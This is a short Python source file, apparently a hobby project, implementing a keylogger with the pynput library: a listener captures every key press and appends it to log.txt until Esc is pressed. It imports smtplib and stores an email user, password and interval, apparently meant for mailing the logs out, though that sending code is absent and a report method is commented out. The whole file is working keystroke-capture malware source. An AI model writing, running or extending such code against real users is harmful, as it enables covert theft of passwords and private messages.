import smtplib
from pynput import keyboard
import threading
import time
class keyLogger:
	def __init__(self,user,passwd,interval):
		self.log = "KeyLogger has started!"
		print(self.log)
		self.log = ""
		self.User = user
		self.Passwd = passwd
		self.Interval = interval
	#def append_to_log(self,string):
	#	self.log = self.log + string
	def process_key_press(self,key):
		current_key = ""
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = " "
			else:
					current_key = " "+str(key)+" "
		#self.append_to_log(current_key)
		self.log = self.log + current_key
		with open("log.txt",'a') as F:
			F.write(self.log)
		self.log = ""
		time.sleep(2)
	def stop_listening(self,key):
		if key == keyboard.Key.esc:
			return False
	""" def report(self):
		with open("log.txt",'a') as F:
			F.write(self.log)
		self.log = ""
		time.sleep(2) """
	def run(self):
		with keyboard.Listener(on_press=self.process_key_press,on_release=self.stop_listening) as listener:
			listener.join()
logger = keyLogger("cuong","1",2)
logger.run()	